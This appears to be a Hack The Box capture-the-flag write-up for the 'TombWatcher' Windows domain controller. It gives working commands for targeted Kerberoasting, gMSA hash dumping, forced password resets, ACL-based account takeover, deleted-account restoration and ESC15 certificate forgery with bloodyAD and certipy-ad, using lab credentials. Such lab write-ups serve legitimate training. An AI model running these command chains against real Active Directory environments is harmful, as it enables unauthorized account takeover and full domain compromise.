---
title: 'HTB-TombWatcher'
published: 2025-09-18
draft: false
toc: true
---
**Start 08:10 26-06-2025**

---
```
Scope:
10.10.11.72

Creds:
henry / H3nry_987TGV!
```
# Recon
## Nmap

```bash
sudo nmap -sC -sV -sT -vvvv -p- -Pn -T5 --min-rate=5000 tomb

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: 2025-06-12 17:52:41Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
3269/tcp  open  ssl/ldap      syn-ack Microsoft Windows Active Directory LDAP (Domain: tombwatcher.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-06-12T17:54:10+00:00; +4h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC01.tombwatcher.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC01.tombwatcher.htb
| Issuer: commonName=tombwatcher-CA-1/domainComponent=tombwatcher
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49691/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         syn-ack Microsoft Windows RPC
49694/tcp open  msrpc         syn-ack Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack Microsoft Windows RPC
49727/tcp open  msrpc         syn-ack Microsoft Windows RPC
49742/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-06-12T17:53:30
|_  start_date: N/A
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 20899/tcp): CLEAN (Timeout)
|   Check 2 (port 33382/tcp): CLEAN (Timeout)
|   Check 3 (port 61752/udp): CLEAN (Timeout)
|   Check 4 (port 60574/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
|_clock-skew: mean: 3h59m59s, deviation: 0s, median: 3h59m59s
```

## 445/TCP - SMB

![](attachments/21f1489a27a76d189fd96b4be1c811f2.png)

![](attachments/33b6d6eda4e57f068af35d6ab8b57a68.png)

![](attachments/bacf0dd9b6902b46bfb19ba40d7f4080.png)

I can't find anything interesting.

## BloodHound

I tried spraying the creds elsewhere but had no access so I decided to boot up `bloodhound`:

![](attachments/6b826746874a78b4c99aa2d456a4fc04.png)

This way I want to find out whether there's any **kerberoastable** users, or anything else juicy for that matter.

![](attachments/9bcfee0e12bafd34b6183983eb1b7d6f.png)

![](attachments/14d23500aebac0bd80fe749c07fbc8db.png)

I then started off by adding *henry* to my list of **owned** users:

![](attachments/e8f0af4642136e48c2d1d08106350168.png)

I then used the **Shortest Path from Owned** cypher and got the following:

![](attachments/f310545d745ffe3d04d06bc95c3f569a.png)

I found some new users:

```
alfred
sam
john
```

![](attachments/a8d1cb9f781b02e2218ea181da0893cc.png)

![](attachments/61658f9eba04ad5833dbb486a69568a8.png)

>[!note]
>This means we can get easy access as *alfred* by using the `targetedKerberoast.py` script and cracking the hash.

### Targeted Kerberoast

```bash
python3 targetedKerberoast.py -v -d 'tombwatcher.htb' -u 'henry' -p 'H3nry_987TGV!' --request-user 'alfred' --dc-ip tombwatcher.htb > alfred.hash
```

![](attachments/5067508592b71500f464120ef3f0d9e3.png)

This error popped up because the target and my machine were out of sync.

#### Clock Fix

In order to fix this I went ahead and used the following command to sync:

![](attachments/8c404012813660f5b06fc3d81c722604.png)

Afterwards the command ran fine:

![](attachments/568cfa2d0109852ad5a0b421d7f12705.png)

### John

Time to use `john` to crack the hash.

![](attachments/a2ef3e9c30c67a338ae342d0d2b8a47b.png)

```
alfred
basketball
```

One more set of creds to add to our spraying list.

>[!note]
>this yet again yielded no interesting entry point.

Time to check `bloodhound` again:

![](attachments/ba5b337c1335bd76a9cac25e164dcab1.png)

![](attachments/f33976d651c538ebdfe4da607c534d7d.png)

### Adding Alfred to INFRASTRUCTURE

We need to issue the following commands.

```bash
# Change group
bloodyAD -u 'alfred' -p 'basketball' -d 'tombwatcher.htb' --dc-ip 10.10.11.72 add groupMember 'INFRASTRUCTURE' alfred

# Verify change
net rpc group members "INFRASTRUCTURE" -U "tombwatcher.htb/Alfred"%"basketball" -S "DC01.tombwatcher.htb"
```

![](attachments/aca52b94dd4c496d3916502c7a2b0cc5.png)

*alfred* has been successfully added and we can continue on down the chain.

![](attachments/313d849e44bd4afd8bda60f98081b585.png)

![](attachments/5feee76790da68aac614239ffabe0f5c.png)

I click on the link and download `gMSADumper.py` the script from the [github page](https://github.com/micahvandeusen/gMSADumper):

![](attachments/ccbb10f717a2624f395c1102fa11b51f.png)

```bash
python3 gMSADumper.py -u 'alfred' -p 'basketball' -d 'tombwatcher.htb'
```

![](attachments/a06a492f9cd2e7853336cc788e7656a3.png)

And just like that I got the hash for *ansible_dev*.

### Force Change Password

Next in line is *sam*, and to get to them we need to do the following:

![](attachments/044e08c2744ac69aa2923ea7d8b1d703.png)

![](attachments/34b5350db18bcdf889e4b1dd2c47f533.png)

For this I will once again be using `bloodyAD`:

```bash
bloodyAD -u 'ansible_dev$' -p ':4b21348ca4a9edff9689cdf75cbda439' -d 'tombwatcher.htb' --host 10.10.11.72 set password 'sam' 'password123'
```

![](attachments/a57e3819d7c3e3125d2ebc9f51de840b.png)

Now we can log into `winrm` with *sam*.

>[!fail]
>....or rather not?
>

![](attachments/f0c43b574e2945d65dbea0e77057e809.png)

It keeps hanging then fails, I guess we need to keep going down the chain.

![](attachments/a6fddd64cb180c56c0e83d49a8982194.png)

For this vector there's multiple sorts of abuse, but I'll try out the **targeted kerberoast** first.

![](attachments/bb21285850a3d597b44f5a7ce3313827.png)

However that didn't work, let's enumerate the other options.

![](attachments/9cd798bdb6704303f9342774d84dd99c.png)

Password change didn't work either.

### User Takeover via ACL Abuse

Instead we'll have to use the following sequence of events in order to takeover *john*'s account by abusing the ACL privileges:

```bash
bloodyAD -u 'sam' -p 'password123' -d 'tombwatcher.htb' --host 10.10.11.72 set owner john sam                  

bloodyAD -u 'sam' -p 'password123' -d 'tombwatcher.htb' --host 10.10.11.72 add genericAll john sam                                                                                                                            bloodyAD -u 'sam' -p 'password123' -d 'tombwatcher.htb' --host 10.10.11.72 set password 'john' 'password123'
```

![](attachments/614d393ed3b0775ca615c060305f0dff.png)

Now we can get on with logging in and getting the foothold!

# Foothold
## Evil-winrm as John

![](attachments/54268d999e5e44730bf7486810e65cd9.png)

### user.txt

![](attachments/f271cd65a07b9fa9380ce85812546be3.png)

## Enumeration

Now it's time to further enumerate the machine:

![](attachments/50e3b2a1aec065ccdc4b859843b2519e.png)

No low hanging fruit.

`bloodhound` tells us the following, maybe we just need to finish following this chain.

![](attachments/6c71c0dac149a288717a76eda837f7d7.png)

I will now use the following command to enumerate previously deleted user accounts, specifically looking for any privileged users that were part of the **ADCS** (Active Directory Certificate Services) structure.

```powershell
Get-ADObject -Filter {isDeleted -eq $true -and ObjectClass -eq "user"} -IncludeDeletedObjects -Properties samAccountName, objectSid, whenCreated, whenChanged, lastKnownParent | 
Select-Object Name, samAccountName, ObjectGUID, @{Name="SID";Expression={$_.objectSid}}, @{Name="Changed";Expression={$_.whenChanged}}, @{Name="LastKnown";Expression={$_.lastKnownParent}} | 
Format-Table -AutoSize -Wrap
```

![](attachments/4cd44f2c1455960edc80e561b6376f87.png)

>[!TLDR] Explanation
>I am hunting for a previously deleted **privileged user**, likely tied to **Certificate Services abuse** (ESC1/ESC6/etc.). If I can **restore** `cert_admin`, I might:
>- **Re-enable** a privileged user account
>- **Reuse known creds** (password or cert)
>- Abuse **enrollment rights** or **existing templates**

So what does the above tell us?

- There were **multiple instances** of a `cert_admin` account.
- All were deleted, but **the name and OU (ADCS)** suggest it had elevated privileges related to certificate services.
- If **ADCS misconfigurations exist**, this account might have left behind **orphaned certificates or enrollments** you can abuse.

# Privilege Escalation
## Restoring cert_admin

So we need to restore the last instance of the *cert_admin* account as follows, in order to leverage it and escalate privs.

![](attachments/33cb7e764dae854e0ed06151b3b8582d.png)

![](attachments/68197d801e7d24ab32b92f21079fcbda.png)

Now that that is done we need to use `bloodyAD` again to set a new password for this account:

![](attachments/3bfc18d09064ae7004132ad103a79e01.png)

Not fully there yet however, we still cannot log into `winrm` with this user, since this is a **certificate service account** we need to use `certipy-ad` to find vulnerabilities that we can exploit.

![](attachments/7343570f08fa0cebfd8819f7115ed661.png)

This gives a lot of info, but the most important part is in the bottom:

![](attachments/d2144fbc33acbd9c02ef04c0ca379f1d.png)

According to the script the target is vulnerable to **ESC15**.

>[!note]
>More about this topic [here](https://abrictosecurity.com/esc15-the-evolution-of-adcs-attacks/)

## ESC15 Abuse
### Forging Administrator Cert 

Now we will use the following commands to forge new certificates and change the *Administrator* password:

```bash
certipy-ad req -u 'cert_admin@tombwatcher.htb' -p 'password123' -target 'DC01.tombwatcher.htb' -ca 'tombwatcher-CA-1' -template 'WebServer' -upn 'Administrator' -application-policies 'Client Authentication'

certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72

certipy-ad auth -pfx administrator.pfx -dc-ip 10.10.11.72 -domain tombwatcher.htb -ldap-shell
```

![](attachments/4092c047c8d51bd21c3fdfb8ca12efcf.png)

Now we can go ahead and use the newly set creds to log into `evil-winrm` as *Administrator*:

![](attachments/5aa0cd3be45030471f35ea624d6124c0.png)

### root.txt

![](attachments/169436bc343b0aeb1430c7f0d1d502fb.png)

![](attachments/d73efcac98bffd48427d613d21b199ab.png)

---

**Finished 11:03 26-06-2025**

[^Links]: [[Hack The Box]]

#ADCS #kerberoasting #forcechangepassword #BloodHound #ACL #BloodyAD #ESC15 #certipy-ad 
